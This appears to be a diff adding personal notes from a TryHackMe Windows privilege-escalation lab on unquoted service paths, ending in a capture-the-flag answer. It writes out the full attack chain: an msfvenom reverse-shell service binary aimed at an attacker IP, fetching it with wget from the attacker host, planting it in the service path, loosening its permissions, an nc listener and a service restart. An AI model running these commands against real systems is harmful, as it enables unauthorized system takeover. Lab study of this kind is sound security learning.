@@ -111,4 +111,33 @@ sc stop windowsscheduler
 sc start windowsscheduler
 *THM{AT_YOUR_SERVICE}
 
+-----------------------------------------------------------------------------------------------------------------------
+
+Unquoted Service Paths
+-path of assciated exe is not properly quoted to account of spaces on the command
+-using powershell need to use sc.exe to control services 
+-SCM searches a list for the correct exe to run
+-an attacker could create a payload exe that is searched
+sc qc "disk sorter enterprise"
+-check if permision to create files and folders in C:\
+icacls c:\MyPrograms
+-if BUILTIN\\Users has AD and WD privileges
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=[ATTACK_IP] LPORT=[PORT] -f exe-service -o rev-svc2.exe
+-serve file
+phython3 -m http.server
+-get file
+wget http://[Attacker_IP]:[port]/rev-svc2.exe -O rev-svc2.exe
+-move file
+move C:\Users\thm-unpriv\rev-svc2.exe C:\MyPrograms\Disk.exe
+-get permission to restart disk sorter
+cd C:\
+icacls C:\MyPrograms\Disk.exe /grant Everyone:F
+-start listener
+nc -lvp [PORT]
+-stop and restart disk sorter
+sc stop "disk sorter enterprise"
+sc start "disk sorter enterprise"
+*THM{QUOTES_EVERYWHERE}
+
+
 
